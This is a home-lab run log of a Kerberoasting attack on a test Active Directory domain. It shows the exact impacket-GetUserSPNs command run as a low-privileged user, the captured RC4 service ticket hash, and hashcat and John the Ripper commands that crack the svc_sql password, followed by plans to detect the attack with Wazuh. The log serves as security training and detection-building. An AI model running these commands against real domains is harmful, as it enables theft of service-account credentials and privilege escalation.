# Project 01 — Kerberoasting: Run Log

Actual execution record of the attack described in [`README.md`](README.md).
Run on **2026-07-24** from KALI01 (`10.10.10.40`) against DC01 (`10.10.10.10`),
red phase (KALI01 + DC01 up, Wazuh off).

---

## Environment at run time
- **KALI01** — Kali 2026.2, `felix@felix`, eth0 = NAT (`10.0.2.15`, internet),
  eth1 = host-only (`10.10.10.40/24`, static, DNS → `10.10.10.10`).
- **DC01** — `lab.local` DC, `10.10.10.10`, NTDS running. DNS resolves
  `dc01.lab.local` and reverse. Ping + Kerberos reachable from Kali.
- Tooling shipped with Kali: `impacket-GetUserSPNs`, `john` (v — krb5tgs format),
  `hashcat v7.1.2`, `netexec`.

## Step 1 — Request the service ticket (Kerberoast)

Run as a **low-privileged** domain user (`a.mokaya`) — the whole point is that no
elevation is required:

```bash
impacket-GetUserSPNs 'lab.local/a.mokaya:Autumn2026!' -dc-ip 10.10.10.10 -request \
    -outputfile kerberoast_hashes.txt
```

Output ([`evidence/getuserspns_output.txt`](evidence/getuserspns_output.txt)):

```
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
MSSQLSvc/dc01.lab.local:1433  svc_sql            2026-07-23 22:33:16.706233  <never>
```

A single SPN account (`svc_sql`, misconfig #1) was found and a TGS-REP hash written:

```
$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$b52ecd83...<truncated>
```

The `$23$` = RC4 (etype 0x17) — the crackable encryption type. Modern accounts
should use AES (0x12); RC4 here is what makes offline cracking fast.

## Step 2 — Crack the hash offline

The canonical tool is **hashcat mode 13100**:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

> **Host note:** this VM has no GPU and Kali 2026.2's mirror had no `pocl` (CPU
> OpenCL) package, so hashcat reported `CL_PLATFORM_NOT_FOUND_KHR` (no compute
> backend). I therefore cracked with **John the Ripper**, which cracks the identical
> `krb5tgs` hash on CPU with no OpenCL dependency. Same hash, same result. On a
> GPU-equipped host, the hashcat command above is the one to use.

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
john --format=krb5tgs --show kerberoast_hashes.txt
```

Output ([`evidence/john_output.txt`](evidence/john_output.txt)):

```
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
P@ssw0rd         (?)
1g 0:00:00:00 DONE  ...
```

**Recovered credential: `svc_sql : P@ssw0rd`** — cracked in under a second because the
service account was given a weak password on purpose.

## Result

Starting from an ordinary domain user, I recovered a service account's plaintext
password with **no elevation and no interaction with the target service** — a
realistic foothold-to-escalation step. `svc_sql`'s credentials can now be reused
(e.g. against the SQL service, or as a spray/pivot candidate).

## What's next (blue phase)
This attack writes **Event ID 4769** on DC01 with `Ticket Encryption Type 0x17` for
`svc_sql`. Once WAZUH01 is up, the detection rule (`100010`) for RC4 TGS bursts should
fire on this exact run. See [README.md §4](README.md).

## Evidence

Screenshots captured live from the KALI01 GUI terminal (2026-07-24):

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali on `10.10.10.40` pinging DC01 and resolving `dc01.lab.local` |
| 2 | [`evidence/02-getuserspns-svc_sql.png`](evidence/02-getuserspns-svc_sql.png) | `impacket-GetUserSPNs` as `a.mokaya` enumerating the `svc_sql` SPN and requesting the TGS |
| 3 | [`evidence/03-john-cracks-password.png`](evidence/03-john-cracks-password.png) | John cracking the RC4 TGS → **`svc_sql : P@ssw0rd`** |

Raw command output:
- [`evidence/getuserspns_output.txt`](evidence/getuserspns_output.txt) — SPN enumeration + TGS request
- [`evidence/john_output.txt`](evidence/john_output.txt) — offline crack recovering `P@ssw0rd`

- 📸 _TODO:_ Wazuh alert screenshot once blue phase is built.

> **Display note:** capturing legible GUI screenshots required switching KALI01's
> graphics controller to **VMSVGA with 128 MB VRAM** (`VBoxManage modifyvm KALI01
> --graphicscontroller vmsvga --vram 128`). With the previous `vboxsvga`/64 MB the
> GNOME session rendered black/garbled in screenshots. Recorded in
> [`../../setup/TROUBLESHOOTING.md`](../../setup/TROUBLESHOOTING.md).
